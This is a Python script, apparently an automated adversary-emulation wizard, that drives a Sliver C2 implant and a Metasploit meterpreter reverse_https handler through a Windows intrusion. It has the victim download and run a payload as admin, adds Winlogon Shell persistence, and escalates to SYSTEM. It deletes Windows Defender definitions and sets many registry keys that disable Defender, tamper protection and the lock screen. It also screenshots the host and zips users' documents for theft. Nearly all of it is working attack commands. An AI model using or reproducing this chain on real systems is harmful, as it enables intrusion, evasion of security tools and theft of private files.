
import asyncio
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")
    from attack_executor.post_exploit.Sliver import SliverExecutor
    sliver_executor = SliverExecutor(config=config)
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
        """)
    confirm_action()


    # Sliver-session selection
    console.print("[bold cyan]\n[Sliver Executor] Session Selection[/]")
    sliver_sessionid = await sliver_executor.select_sessions()

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: powershell[/]")
    confirm_action()
    try:
        await sliver_executor.powershell(user_params["SessionID"], user_params["Commands"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()
    commands = """
    Get-AdGroup -Filter *
    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: tcp[/]")
    console.print(f"  Description: Show TCP connections (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for tcp [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: tcp")
    user_params["tcp"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: udp[/]")
    console.print(f"  Description: Show UDP connections (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for udp [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: udp")
    user_params["udp"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: ipv4[/]")
    console.print(f"  Description: Show IPv4 connections (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for ipv4 [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: ipv4")
    user_params["ipv4"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: ipv6[/]")
    console.print(f"  Description: Show IPv6 connections (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for ipv6 [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: ipv6")
    user_params["ipv6"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: listening[/]")
    console.print(f"  Description: Show listening ports (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for listening [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: listening")
    user_params["listening"] = user_input

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: netstat[/]")
    confirm_action()
    try:
        await sliver_executor.netstat(user_params["tcp"], user_params["udp"], user_params["ipv4"], user_params["ipv6"], user_params["listening"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()
    commands = """
    Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, #{binary_to_execute}" -Force
    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()


    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 9 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: remote_path[/]")
    console.print(f"  Description: Full path of the directory to create")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for remote_path [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: remote_path")
    user_params["remote_path"] = user_input

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: mkdir[/]")
    confirm_action()
    try:
        await sliver_executor.mkdir(user_params["remote_path"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()
    commands = """
    Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force
    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: screenshot[/]")
    confirm_action()
    try:
        await sliver_executor.screenshot(user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()
    commands = """
    $startingDirectory = "C:"
    $outputZip = "#{output_zip_folder_path}"
    $fileExtensionsString = ".doc, .docx, .txt"
    $fileExtensions = $fileExtensionsString -split ", "
    New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
    Function Search-Files {
    param (
    [string]$directory
    )
    $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
    $fileExtensions -contains $_.Extension.ToLower()
    }
    return $files
    }
    $foundFiles = Search-Files -directory $startingDirectory
    if ($foundFiles.Count -gt 0) {
    $foundFilePaths = $foundFiles.FullName
    Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
    Write-Host "Zip file created: $outputZip\data.zip"
    } else {
    Write-Host "No files found with the specified extensions."
    }
    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()


    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 14 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: hosting_process[/]")
    console.print(f"  Description: Target process ID or name for privilege escalation")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for hosting_process [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: hosting_process")
    user_params["hosting_process"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 14 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: config[/]")
    console.print(f"  Description: Configuration options for escalation method")
    default_val = "Service"
    user_input = console.input(
        f"[bold]➤ Enter value for config [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: config")
    user_params["config"] = user_input

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: get_system[/]")
    confirm_action()
    try:
        await sliver_executor.get_system(user_params["hosting_process"], user_params["config"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()
    commands = """
    reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -RemoveDefinitions -All

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f >NUL 2>nul 
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\software\microsoft\windows defender\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f >NUL 2>nul
    reg add \"HKLM\Software\Microsoft\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
        """)
    confirm_action()

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: powershell[/]")
    confirm_action()
    try:
        await sliver_executor.powershell(user_params["SessionID"], user_params["Commands"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()
    commands = """
    dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}
    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    from attack_executor.exploit.Metasploit import MetasploitExecutor

    console.print(f"[bold cyan]\n📌[Metasploit Executor] Step 24 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LHOST[/]")
    console.print(f"  Description: IP address of the attacker machine")
    default_val = "None"
    user_input = console.input(
        f"[bold]➤ Enter value for LHOST [default: {default_val}]: [/]"
    ) or default_val

    if not user_input and False:
        raise ValueError("Missing required parameter: LHOST")
    user_params["LHOST"] = user_input

    console.print(f"[bold cyan]\n📌[Metasploit Executor] Step 24 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: LPORT[/]")
    console.print(f"  Description: listening port of the attacter machine")
    default_val = "None"
    user_input = console.input(
        f"[bold]➤ Enter value for LPORT [default: {default_val}]: [/]"
    ) or default_val

    if not user_input and False:
        raise ValueError("Missing required parameter: LPORT")
    user_params["LPORT"] = user_input

    # Metasploit configuration
    with console.status("[bold green]Configuring Metasploit payload..."):
        metasploit_executor = MetasploitExecutor(config=config)
        metasploit_executor.exploit_and_execute_payload(
            exploit_module_name="exploit/multi/handler",
            payload_module_name="windows/meterpreter_reverse_https",
            LHOST=user_params["LHOST"], LPORT=user_params["LPORT"]
    )
    metasploit_sessionid = metasploit_executor.select_session(
    )
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the target payload file
        3. Download the payload file
        4. Execute the payload file to #{PATH} as Admin (Root)
        """)
    confirm_action()

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: screenshot[/]")
    confirm_action()
    try:
        await sliver_executor.screenshot(user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: powershell[/]")
    confirm_action()
    try:
        await sliver_executor.powershell(user_params["SessionID"], user_params["Commands"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise


    confirm_action()
    commands = """
    reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

if __name__ == "__main__":
    asyncio.run(main())
